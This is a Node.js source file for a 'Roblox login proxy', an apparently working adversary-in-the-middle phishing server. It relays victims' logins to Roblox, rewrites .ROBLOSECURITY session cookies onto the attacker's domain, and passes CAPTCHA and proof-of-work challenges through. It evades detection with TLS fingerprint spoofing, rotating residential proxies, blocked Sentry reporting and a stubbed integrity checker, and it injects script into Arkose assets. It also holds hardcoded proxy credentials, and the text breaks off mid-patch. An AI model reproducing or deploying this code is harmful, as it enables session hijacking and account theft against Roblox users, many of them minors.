const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { spawn, execFile } = require('child_process');
const crypto = require('crypto');
const path = require('path');

const app = express();

console.log('='.repeat(60));
console.log('🔒 ROBLOX LOGIN PROXY - FIXED VERSION');
console.log('='.repeat(60));

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE (for ALL requests - TLS fingerprint spoofing)
// ─────────────────────────────────────────────────────────────
let CURL_BIN = 'curl';
function detectCurlBin() {
    const candidates = ['curl_chrome124', 'curl_chrome120', 'curl_chrome116', 'curl-impersonate-chrome', 'curl'];
    let idx = 0;
    function tryNext() {
        if (idx >= candidates.length) return;
        const bin = candidates[idx++];
        execFile(bin, ['--version'], { timeout: 3000 }, (err) => {
            if (!err) {
                CURL_BIN = bin;
                if (bin === 'curl') {
                    console.warn('⚠️  curl-impersonate NOT found — using plain curl.');
                } else {
                    console.log(`✅ curl-impersonate: ${bin}`);
                }
            } else { tryNext(); }
        });
    }
    tryNext();
}
detectCurlBin();

// ─────────────────────────────────────────────────────────────
// RESIDENTIAL PROXIES (optional - for additional IP rotation)
// ─────────────────────────────────────────────────────────────
const RESIDENTIAL_PROXIES = [
    'http://104574_FmGRR_s_1KB03APR4ILFSCMW:HoxFFU3jQA@residential.pingproxies.com:8872',
    'http://104574_FmGRR_s_BAY283TIWZ05HV2A:HoxFFU3jQA@residential.pingproxies.com:8392',
    'http://104574_FmGRR_s_Y3QTLQRA0S49RUWK:HoxFFU3jQA@residential.pingproxies.com:8269',
    'http://104574_FmGRR_s_L8K0M14X3H8KAIOL:HoxFFU3jQA@residential.pingproxies.com:8221',
    'http://104574_FmGRR_s_Q4FLL3QJZ46JQ2YF:HoxFFU3jQA@residential.pingproxies.com:8977',
];
let proxyIndex = 0;
function getNextProxy() {
    const p = RESIDENTIAL_PROXIES[proxyIndex];
    proxyIndex = (proxyIndex + 1) % RESIDENTIAL_PROXIES.length;
    return p;
}

// ─────────────────────────────────────────────────────────────
// SHARED AGENTS (fallback only)
// ─────────────────────────────────────────────────────────────
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, timeout: 30000 });

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'x-retry-attempt',
];

// Cache for PoW challenge metadata keyed by challengeId
const powMetadataCache = new Map();

// ─────────────────────────────────────────────────────────────
// BLOCK SENTRY INGEST — silently drop all reporting requests
// ─────────────────────────────────────────────────────────────
app.all(/\/api\/\d+\/(envelope|store)\//i, (req, res) => {
    res.status(200).json({});
});

// ─────────────────────────────────────────────────────────────
// SILENCE bundleVerifier.js — no file needed, served inline
// ─────────────────────────────────────────────────────────────
app.get(/bundleVerifier\.js/, (req, res) => {
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    res.send(`var Roblox=Roblox||{};Roblox.BundleDetector=(function(){return{jsBundlesLoaded:{},bundlesReported:{},counterNames:{},loadStates:{},bundleContentTypes:{},timing:undefined,setTiming:function(){},getLoadTime:function(){return 0;},getCurrentTime:function(){return Date.now();},getCdnProviderName:function(u,cb){cb();},getCdnProviderAndReportMetrics:function(){},reportMetrics:function(){},logToEphemeralCounter:function(){},logToEventStream:function(){},getCdnInfo:function(){},reportBundleError:function(){},bundleDetected:function(n){this.jsBundlesLoaded[n]=true;},verifyBundles:function(){}};})();`);
});

// ─────────────────────────────────────────────────────────────
// SERVE MODIFIED JS FILES
// ─────────────────────────────────────────────────────────────
app.use('/js', express.static(path.join(__dirname, 'modified-js')));

// ─────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────
function generateProxyMetaTags() {
    const sid    = crypto.randomBytes(16).toString('hex');
    const secure = crypto.createHash('md5').update(sid).digest('hex');
    return `<meta name="proxy" value="${sid}">` +
           `<meta name="token" value="${sid}">` +
           `<meta name="secure" value="${secure}">` +
           `<meta name="meta" value="">`;
}

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    const cleanHost = host.replace(/^www\./, '');
    return cookies.map(c =>
        c.replace(/Domain=\.?roblox\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?arkoselabs\.com/gi, `Domain=.${cleanHost}`)
         .replace(/Domain=\.?pingproxies\.com/gi, `Domain=.${cleanHost}`)
         .replace(/\bSecure\b/gi, 'Secure; SameSite=None')
    );
}

function getCleanHost(req) {
    const origin = req.headers['origin'] || '';
    if (origin.startsWith('https://')) {
        const originHost = origin.replace('https://', '').split('/')[0];
        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
            return originHost;
        }
    }
    return req.headers.host || 'localhost';
}

function getDeviceId(req) {
    const m = (req.headers.cookie || '').match(/rbx-device-id=([^;]+)/);
    return m ? m[1] : crypto.randomBytes(32).toString('hex');
}

function setCors(res, origin) {
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
    res.set('Access-Control-Allow-Headers', [
        'Content-Type', 'x-csrf-token', 'Authorization',
        'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
        'Accept', 'Accept-Language', 'Accept-Encoding',
        'traceparent', 'baggage', 'sentry-trace',
        ...CHALLENGE_HEADERS
    ].join(', '));
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
}

// ─────────────────────────────────────────────────────────────
// LOGGING
// ─────────────────────────────────────────────────────────────
app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const skip = ['/www/e.png', '/pe'];
        if (!skip.some(s => req.path.includes(s))) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${Date.now() - start}ms)`);
        }
    });
    next();
});

// ─────────────────────────────────────────────────────────────
// CORS PREFLIGHT
// ─────────────────────────────────────────────────────────────
app.options('*', (req, res) => {
    setCors(res, req.headers['origin'] || `https://${req.headers.host}`);
    res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────
// CURL-IMPERSONATE REQUEST FUNCTION
// ─────────────────────────────────────────────────────────────
function makeCurlRequest(method, url, headers, body, useProxy = false) {
    return new Promise((resolve, reject) => {
        const args = [
            '--silent', '--include', '--max-time', '45',
            '--http2', '--compressed',
            '-X', method.toUpperCase()
        ];

        if (useProxy) {
            const proxyUrl = getNextProxy();
            args.push('-x', proxyUrl);
            args.push('--tlsv1.2');
            args.push('--proxy-insecure');
        }

        const skipHeaders = new Set([
            'host', 'content-length', 'transfer-encoding',
            'connection', 'accept-encoding'
        ]);

        for (const [k, v] of Object.entries(headers)) {
            if (!skipHeaders.has(k.toLowerCase())) {
                args.push('-H', `${k}: ${v}`);
            }
        }

        if (headers['user-agent']) {
            args.push('-H', `User-Agent: ${headers['user-agent']}`);
        }

        if (body && body.length > 0) {
            args.push('--data-binary', '@-');
        }

        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 50000 });

        if (body && body.length > 0) {
            child.stdin.write(body);
        }
        child.stdin.end();

        const chunks = [];
        let stderr = '';

        child.stdout.on('data', c => chunks.push(c));
        child.stderr.on('data', c => { stderr += c.toString(); });

        child.on('error', (err) => {
            reject(new Error(`curl spawn error: ${err.message}`));
        });

        child.on('close', (code) => {
            if (code !== 0 && code !== null) {
                return reject(new Error(`curl exited with code ${code}. stderr: ${stderr}`));
            }

            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');

            const httpRe = /HTTP\/[^\s]+\s+\d+/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;

            if (!lastMatch) {
                return reject(new Error(`No HTTP response found. stderr: ${stderr}`));
            }

            const hdrStart = lastMatch.index;
            const hdrEnd = raw.indexOf('\r\n\r\n', hdrStart);

            if (hdrEnd === -1) {
                return reject(new Error('Malformed HTTP response - no header end'));
            }

            const statusLine = raw.substring(hdrStart, raw.indexOf('\r\n', hdrStart));
            const statusCode = parseInt(statusLine.match(/\d{3}/)?.[0] || '0', 10);

            const parsedHdrs = {};
            const headerLines = raw.substring(hdrStart, hdrEnd).split('\r\n').slice(1);
            for (const line of headerLines) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                if (parsedHdrs[k] !== undefined) {
                    parsedHdrs[k] = Array.isArray(parsedHdrs[k])
                        ? [...parsedHdrs[k], v]
                        : [parsedHdrs[k], v];
                } else {
                    parsedHdrs[k] = v;
                }
            }

            const responseBody = buf.slice(hdrEnd + 4);
            resolve({ statusCode, headers: parsedHdrs, body: responseBody });
        });
    });
}

// ─────────────────────────────────────────────────────────────
// LOGIN HANDLER
// ─────────────────────────────────────────────────────────────
async function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, useProxy = false) {
    const headers = {
        'Content-Type':    'application/json;charset=UTF-8',
        'Accept':          'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      ua || BROWSER_UA,
    };

    const forward = ['rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token', ...CHALLENGE_HEADERS];
    for (const h of forward) {
        if (extraHeaders[h]) headers[h] = extraHeaders[h];
    }

    if (cookieHeader) headers['Cookie'] = cookieHeader;
    if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

    const url = 'https://auth.roblox.com/v2/login';
    const body = Buffer.from(bodyStr, 'utf8');

    return await makeCurlRequest('POST', url, headers, body, useProxy);
}

async function doLoginWithRetry(bodyStr, cookie, csrf, ua, extra, maxRetries = 3) {
    let lastErr;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            const useProxy = i > 0;
            return await doLoginRequest(bodyStr, cookie, csrf, ua, extra, useProxy);
        } catch (e) {
            lastErr = e;
            console.log(`   Retry ${i + 1}/${maxRetries + 1}: ${e.message}`);
            await new Promise(r => setTimeout(r, 500 * (i + 1)));
        }
    }
    throw lastErr;
}

function forwardLoginResponse(res, result, host, origin, deviceId) {
    let cookieDomain = host;
    if (origin && origin.startsWith('https://')) {
        const originHost = origin.replace('https://', '').split('/')[0];
        if (!/^\d+\.\d+\.\d+\.\d+/.test(originHost)) {
            cookieDomain = originHost;
        }
    }
    const cleanHost = cookieDomain.replace(/^www\./, '');
    setCors(res, origin);

    for (const h of ['x-csrf-token', 'content-type', 'cache-control', ...CHALLENGE_HEADERS]) {
        if (result.headers[h]) res.set(h, result.headers[h]);
    }

    let cookies = rewriteCookies(result.headers['set-cookie'], cookieDomain) || [];
    if (deviceId) cookies.push(`rbx-device-id=${deviceId}; Domain=.${cleanHost}; Path=/; Secure; SameSite=None`);
    if (cookies.length) res.set('Set-Cookie', cookies);

    const hasRoblo = (result.headers['set-cookie'] || []).some(c =>
        Array.isArray(c) ? c.some(sc => sc.includes('.ROBLOSECURITY')) : c.includes('.ROBLOSECURITY')
    );
    if (hasRoblo) console.log('✅ .ROBLOSECURITY received — login success!');
    else if (result.statusCode === 200) console.log('⚠️  200 but no .ROBLOSECURITY');

    res.status(result.statusCode).send(result.body);
}

async function loginHandler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const host     = req.headers.host || 'localhost';
    const origin   = req.headers['origin'] || `https://${host}`;
    const ua       = req.headers['user-agent'] || BROWSER_UA;
    const cookies  = req.headers['cookie'] || '';
    const deviceId = getDeviceId(req);

    const hasChallenge = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
    console.log(`🔑 LOGIN | Challenge: ${hasChallenge ? 'YES' : 'NO'} | curl: ${CURL_BIN}`);

    try {
        const bodyStr = req.body.toString('utf8');

        if (hasChallenge) {
            const csrfFromCookie = cookies.match(/X-CSRF-TOKEN=([^;]+)/i)?.[1] ||
                                   cookies.match(/csrf-token=([^;]+)/i)?.[1] || null;

            const challengeHeaders = { ...req.headers };
            const incomingChallengeId = req.headers['rblx-challenge-id'] || '';
            const incomingMeta = req.headers['rblx-challenge-metadata'] || '';
            const incomingType = req.headers['rblx-challenge-type'] || '';

            if (incomingType === 'proofofwork' && incomingChallengeId && incomingMeta) {
                const cachedRaw = powMetadataCache.get(incomingChallengeId);
                if (cachedRaw) {
                    try {
                        const browserMeta = JSON.parse(Buffer.from(incomingMeta, 'base64').toString('utf8'));
                        const redemptionToken = browserMeta.redemptionToken || '';

                        const cachedObj = JSON.parse(Buffer.from(cachedRaw, 'base64').toString('utf8'));
                        cachedObj.redemptionToken = redemptionToken;
                        const fullMeta = Buffer.from(JSON.stringify(cachedObj)).toString('base64');

                        challengeHeaders['rblx-challenge-metadata'] = fullMeta;
                        console.log(`   PoW metadata rebuilt for ${incomingChallengeId.slice(0,20)}...`);
                        console.log(`   redemptionToken: ${redemptionToken.slice(0,16)}...`);
                        powMetadataCache.delete(incomingChallengeId);
                    } catch (e) {
                        console.warn(`   Failed to rebuild PoW metadata: ${e.message}`);
                    }
                } else {
                    console.warn(`   No cached metadata for ${incomingChallengeId} — sending as-is`);
                }
            }

            let result = await doLoginWithRetry(bodyStr, cookies, csrfFromCookie, ua, challengeHeaders);
            console.log(`   Challenge login attempt 1: ${result.statusCode}`);

            if (result.statusCode === 403 && result.headers['x-csrf-token']) {
                const csrfToken = result.headers['x-csrf-token'];
                console.log(`   Got CSRF token ${csrfToken.slice(0,8)}..., retrying with challenge headers`);
                let cookieHeader = cookies;
                if (result.headers['set-cookie']) {
                    const extra = [].concat(result.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                    cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
                }
                result = await doLoginWithRetry(bodyStr, cookieHeader, csrfToken, ua, challengeHeaders);
                console.log(`   Challenge login attempt 2: ${result.statusCode}`);
            }

            if (result.statusCode === 200) console.log('✅ LOGIN SUCCESS (with challenge)');
            else console.log(`❌ Challenge login failed: ${result.statusCode}`);

            return forwardLoginResponse(res, result, host, origin, deviceId);
        }

        const step1 = await doLoginWithRetry(bodyStr, cookies, null, ua, req.headers);
        console.log(`   Step 1: ${step1.statusCode}`);
        if (!step1.headers['x-csrf-token']) return forwardLoginResponse(res, step1, host, origin, deviceId);

        let cookieHeader = cookies;
        if (step1.headers['set-cookie']) {
            const extra = [].concat(step1.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }
        const step2 = await doLoginWithRetry(bodyStr, cookieHeader, step1.headers['x-csrf-token'], ua, req.headers);
        console.log(`   Step 2: ${step2.statusCode}`);

        let final = step2;
        if (step2.statusCode === 403 && step2.headers['x-csrf-token'] && step2.headers['x-csrf-token'] !== step1.headers['x-csrf-token']) {
            if (step2.headers['set-cookie']) {
                const extra = [].concat(step2.headers['set-cookie']).map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }
            final = await doLoginWithRetry(bodyStr, cookieHeader, step2.headers['x-csrf-token'], ua, req.headers);
            console.log(`   Step 3: ${final.statusCode}`);
        }

        if (final.statusCode === 200) console.log('✅ LOGIN SUCCESS');
        else if (final.headers['rblx-challenge-id']) {
            console.log('🧩 Challenge required');
            const cid = final.headers['rblx-challenge-id'];
            const meta = final.headers['rblx-challenge-metadata'];
            if (cid && meta) {
                powMetadataCache.set(cid, meta);
                if (powMetadataCache.size > 100) {
                    powMetadataCache.delete(powMetadataCache.keys().next().value);
                }
            }
        }
        else console.log(`❌ Login failed: ${final.statusCode}`);

        forwardLoginResponse(res, final, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
}

app.use('/v2/login', express.raw({ type: '*/*' }), loginHandler);
app.use('/v3/login', express.raw({ type: '*/*' }), loginHandler);

// ─────────────────────────────────────────────────────────────
// CHALLENGE CONTINUE HANDLER
// ─────────────────────────────────────────────────────────────
app.use('/challenge/v1/continue', express.raw({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') return res.status(405).send('Method not allowed');

    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const cookies = req.headers['cookie'] || '';

    try {
        const bodyStr = req.body.toString('utf8');
        let bodyObj;
        try {
            bodyObj = JSON.parse(bodyStr);
        } catch (e) {
            bodyObj = {};
        }

        const originalType = bodyObj.challengeType || 'unknown';
        const challengeId   = bodyObj.challengeID || bodyObj.challengeId || '';
        console.log(`[challenge/continue] Challenge type (original): ${originalType}`);
        console.log(`[challenge/continue] Challenge ID: ${challengeId}`);

        // PoW /continue must be sent to Roblox for server-side validation —
        // do NOT short-circuit it. Fall through to the real /continue call below.

        if (bodyObj.challengeId && !bodyObj.challengeID) {
            bodyObj.challengeID = bodyObj.challengeId;
            delete bodyObj.challengeId;
        }

        if (bodyObj.challengeMetadata && typeof bodyObj.challengeMetadata === 'object') {
            bodyObj.challengeMetadata = JSON.stringify(bodyObj.challengeMetadata);
        }

        const fixedBodyStr = JSON.stringify(bodyObj);
        console.log(`[challenge/continue] Fixed body → ${fixedBodyStr.substring(0, 200)}`);

        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua,
        };

        if (cookies) headers['Cookie'] = cookies;
        if (req.headers['x-csrf-token']) headers['X-CSRF-TOKEN'] = req.headers['x-csrf-token'];
        if (req.headers['rbx-device-id']) headers['rbx-device-id'] = req.headers['rbx-device-id'];
        if (req.headers['x-bound-auth-token']) headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];

        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) headers[h] = req.headers[h];
        }

        const url = 'https://apis.roblox.com/challenge/v1/continue';
        const result = await makeCurlRequest('POST', url, headers, Buffer.from(fixedBodyStr, 'utf8'), false);

        console.log(`[challenge/continue] ← ${result.statusCode}`);

        if (result.statusCode !== 200) {
            console.log(`[challenge/continue] Response: ${result.body.toString().substring(0, 500)}`);
        }

        const skipHdrs = new Set([
            'content-security-policy', 'content-security-policy-report-only',
            'x-content-security-policy', 'transfer-encoding', 'connection',
            'content-encoding', 'keep-alive', 'proxy-authenticate',
            'proxy-authorization', 'te', 'trailers', 'upgrade'
        ]);

        for (const [k, v] of Object.entries(result.headers)) {
            if (skipHdrs.has(k)) continue;
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }

        res.status(result.statusCode).send(result.body);

    } catch (err) {
        console.error(`[challenge/continue] ❌ Error: ${err.message}`);
        res.status(502).json({ error: 'Challenge continue error', message: err.message });
    }
});

// ─────────────────────────────────────────────────────────────
// UNIVERSAL CURL-IMPERSONATE PROXY
// ─────────────────────────────────────────────────────────────
function createCurlProxy(targetHost, pathPrefix, useResidentialProxy = false) {
    return async (req, res) => {
        const origin = req.headers['origin'] || `https://${req.headers.host}`;
        setCors(res, origin);

        let targetPath = req.path;
        if (pathPrefix) {
            targetPath = pathPrefix + req.path;
        }
        const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
        const targetUrl = `https://${targetHost}${targetPath}${qs}`;

        const headers = {
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
            'Accept':          req.headers['accept'] || 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        };

        if (req.headers['content-type']) {
            headers['Content-Type'] = req.headers['content-type'];
        }
        if (req.headers['cookie']) {
            headers['Cookie'] = req.headers['cookie'];
        }
        if (req.headers['x-csrf-token']) {
            headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
        }
        if (req.headers['rbx-device-id']) {
            headers['rbx-device-id'] = req.headers['rbx-device-id'];
        }
        if (req.headers['x-bound-auth-token']) {
            headers['x-bound-auth-token'] = req.headers['x-bound-auth-token'];
        }
        if (req.headers['traceparent']) {
            headers['traceparent'] = req.headers['traceparent'];
        }

        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) headers[h] = req.headers[h];
        }

        let body = null;
        if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
            body = await new Promise((resolve) => {
                const bufs = [];
                req.on('data', c => bufs.push(c));
                req.on('end', () => resolve(Buffer.concat(bufs)));
            });
        }

        try {
            const result = await makeCurlRequest(
                req.method,
                targetUrl,
                headers,
                body,
                useResidentialProxy
            );

            const skipHdrs = new Set([
                'content-security-policy', 'content-security-policy-report-only',
                'x-content-security-policy', 'transfer-encoding', 'connection',
                'content-encoding', 'keep-alive', 'proxy-authenticate',
                'proxy-authorization', 'te', 'trailers', 'upgrade'
            ]);

            for (const [k, v] of Object.entries(result.headers)) {
                if (skipHdrs.has(k)) continue;
                if (k === 'set-cookie') {
                    res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
                } else {
                    try { res.set(k, v); } catch (_) {}
                }
            }

            if (req.path.includes('continue') && result.statusCode !== 200) {
                console.log(`[challenge/continue] ❌ ${result.statusCode}`);
                console.log(`[challenge/continue] Response body: ${result.body.toString().substring(0, 500)}`);
                console.log(`[challenge/continue] Response headers: ${JSON.stringify(result.headers)}`);
            }

            res.status(result.statusCode).send(result.body);

        } catch (err) {
            console.error(`[curl-proxy:${targetHost}] ❌ ${req.method} ${req.path} | ${err.message}`);
            if (!res.headersSent) {
                res.status(502).json({ error: 'Proxy error', message: err.message });
            }
        }
    };
}

// Proxy for /fc/gt2/ — rewrites only challenge_url_cdn to a relative path
function createGt2Proxy() {
    const base = createCurlProxy('arkoselabs.roblox.com', '/fc/gt2', false);
    return async (req, res, next) => {
        const originalSend = res.send.bind(res);
        res.send = function(body) {
            try {
                let str = Buffer.isBuffer(body) ? body.toString('utf8') : (typeof body === 'string' ? body : JSON.stringify(body));
                // Only rewrite challenge_url_cdn — strip the absolute arkoselabs domain to make it a relative path
                str = str.replace(/"challenge_url_cdn":"https?:\\?\/\\?\/arkoselabs\.roblox\.com(\/[^"\\]*)"/g,
                    (_, path) => `"challenge_url_cdn":"${path}"`);
                return originalSend(str);
            } catch (_) {
                return originalSend(body);
            }
        };
        return base(req, res, next);
    };
}

// Proxy for /fc/gfct/ — rewrites only _challenge_imgs URLs to go through the proxy
function createGfctProxy() {
    const base = createCurlProxy('arkoselabs.roblox.com', '/fc/gfct', false);
    return async (req, res, next) => {
        const proxyOrigin = `https://${req.headers.host}`;
        const originalSend = res.send.bind(res);
        res.send = function(body) {
            try {
                let str = Buffer.isBuffer(body) ? body.toString('utf8') : (typeof body === 'string' ? body : JSON.stringify(body));
                // Only rewrite URLs inside _challenge_imgs array
                str = str.replace(/"_challenge_imgs":\[([^\]]*)\]/g, (match, imgs) => {
                    const rewritten = imgs.replace(/https?:\\?\/\\?\/arkoselabs\.roblox\.com/g, proxyOrigin);
                    return `"_challenge_imgs":[${rewritten}]`;
                });
                return originalSend(str);
            } catch (_) {
                return originalSend(body);
            }
        };
        return base(req, res, next);
    };
}

// ─────────────────────────────────────────────────────────────
// ROUTE MAP
// ─────────────────────────────────────────────────────────────

const ARKOSE_ROUTES = [
    ['/arkose-api',     'arkoselabs.roblox.com'],
    ['/arkose-client',  'client-api.arkoselabs.com'],
    ['/arkose-cdn',     'cdn.arkoselabs.com'],
    ['/arkose-fc',      'fc.arkoselabs.com'],
    ['/arkose-game',    'game.arkoselabs.com'],
    ['/arkose-assets',  'assets.arkoselabs.com'],
    ['/arkose-images',  'roblox-images.arkoselabs.com'],
    ['/captcha-rbxcdn', 'captcha.rbxcdn.com'],
    ['/apis-rbxcdn',    'apis.rbxcdn.com'],
];

const ROBLOX_CAPTCHA_HOST = 'captcha.roblox.com';
const ARKOSE_PUBLIC_KEY_PATTERN = /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i;

const API_ROUTES = [
    ['/challenge',                        'apis.roblox.com', '/challenge'],
    ['/account-security-service',         'apis.roblox.com', '/account-security-service'],
    ['/proof-of-work-service',            'apis.roblox.com', '/proof-of-work-service'],
    ['/auth-token-service',               'apis.roblox.com', '/auth-token-service'],
    ['/hba-service',                      'apis.roblox.com', '/hba-service'],
    ['/rotating-client-service',          'apis.roblox.com', '/rotating-client-service'],
    ['/product-experimentation-platform', 'apis.roblox.com', '/product-experimentation-platform'],
    ['/universal-app-configuration',      'apis.roblox.com', '/universal-app-configuration'],
    ['/guac-v2',                          'apis.roblox.com', '/guac-v2'],
    ['/otp-service',                      'apis.roblox.com', '/otp-service'],
    ['/captcha',                          'apis.rbxcdn.com', '/captcha'],
    ['/v1/account-information',           'accountinformation.roblox.com'],
    ['/v2/account-information',           'accountinformation.roblox.com'],
    ['/v1/users',                         'users.roblox.com'],
    ['/v2/users',                         'users.roblox.com'],
    ['/v1/avatar',                        'avatar.roblox.com'],
    ['/v2/avatar',                        'avatar.roblox.com'],
    ['/v1/badges',                        'badges.roblox.com'],
    ['/v1/catalog',                       'catalog.roblox.com'],
    ['/v2/catalog',                       'catalog.roblox.com'],
    ['/v1/economy',                       'economy.roblox.com'],
    ['/v2/economy',                       'economy.roblox.com'],
    ['/v1/friends',                       'friends.roblox.com'],
    ['/v2/friends',                       'friends.roblox.com'],
    ['/v1/presence',                      'presence.roblox.com'],
    ['/v2/presence',                      'presence.roblox.com'],
    ['/v1/thumbnails',                    'thumbnails.roblox.com'],
    ['/v2/thumbnails',                    'thumbnails.roblox.com'],
    ['/v1/groups',                        'groups.roblox.com'],
    ['/v2/groups',                        'groups.roblox.com'],
    ['/v1/metrics',                       'metrics.roblox.com'],
    ['/v1/games',                         'games.roblox.com'],
    ['/v2/games',                         'games.roblox.com'],
    ['/discovery-api',                    'apis.roblox.com', '/discovery-api'],
    ['/user-profile-api',                 'apis.roblox.com', '/user-profile-api'],
    ['/beacon-api',                       'apis.roblox.com', '/beacon-api'],
    ['/platform-chat-api',                'apis.roblox.com', '/platform-chat-api'],
    ['/upsellCard',                       'apis.roblox.com', '/upsellCard'],
    ['/trades',                           'trades.roblox.com'],
    ['/usermoderation',                   'usermoderation.roblox.com'],
    ['/lms',                              'lms.roblox.com'],
    ['/ecsv2-api',                        'ecsv2.roblox.com'],
    ['/client-telemetry',                 'client-telemetry.roblox.com'],
    ['/ephemeralcounters',                'ephemeralcounters.roblox.com'],
    ['/notifications',                    'realtime.roblox.com'],
];

// Register Arkose routes
for (const [prefix, target] of ARKOSE_ROUTES) {
    const targetHost = target.replace(/^https?:\/\//, '').replace(/\/+$/, '');
    app.use(prefix, createCurlProxy(targetHost, '', false));
}

// ── Reporting/metric endpoints — proxied to origin with cookie rewriting enabled ──
app.use('/account-security-service/v1/metrics/record', createCurlProxy('apis.roblox.com', '/account-security-service/v1/metrics/record', false));
app.use('/v1/csp/report', createCurlProxy('metrics.roblox.com', '/v1/csp/report', false));

// Register API routes
for (const [prefix, target, pathPrefix] of API_ROUTES) {
    app.use(prefix, createCurlProxy(target, pathPrefix, false));
}

// ═════════════════════════════════════════════════════════════════════════════
// ═══ SERVE LOCAL MODIFIED FC/ ASSETS FIRST (before proxying to Arkose) ════════
// ═════════════════════════════════════════════════════════════════════════════

// Version-agnostic game_core_bootstrap.js — fetch live from Arkose and patch on the fly.
async function proxyBootstrapJs(req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    // Extract version + mode from the request path, e.g. /1.29.6/standard/
    const pathMatch = req.path.match(/\/bootstrap\/([^/]+)\/([^/]+)\/game_core_bootstrap\.js/);
    const version = pathMatch ? pathMatch[1] : '1.29.6';
    const mode    = pathMatch ? pathMatch[2] : 'standard';
    const targetUrl = `https://arkoselabs.roblox.com/fc/assets/ec-game-core/bootstrap/${version}/${mode}/game_core_bootstrap.js`;
    console.log(`[bootstrap] Live proxy: ${req.path} → ${targetUrl}`);

    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.roblox.com/',
        }, null, false);

        if (result.statusCode >= 400) {
            console.warn(`[bootstrap] Arkose returned ${result.statusCode} — falling back to local file`);
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'fc/assets/ec-game-core/bootstrap/1.29.6/standard/game_core_bootstrap.js'));
        }

        let body = result.body.toString();

        // ── Patch 1: Prepend fetch X-Proxy header injection ──────────────────
        // Wraps the global fetch so every request inside the bootstrap
        // automatically carries the X-Proxy header read from the proxy meta tag.
        const XPROXY_INJECT = `fetch=((f=fetch)=>(u,i={})=>(i.headers={...i.headers,'X-Proxy':window.top.document.querySelector('meta[name="proxy"]').getAttribute('value')||''},f(u,i)))();`;
        body = XPROXY_INJECT + body;
        console.log('[bootstrap] ✅ Patch 1: fetch X-Proxy injection prepended');

        // ── Patch 2: Replace publicPath resolver (k) with location.origin ─────
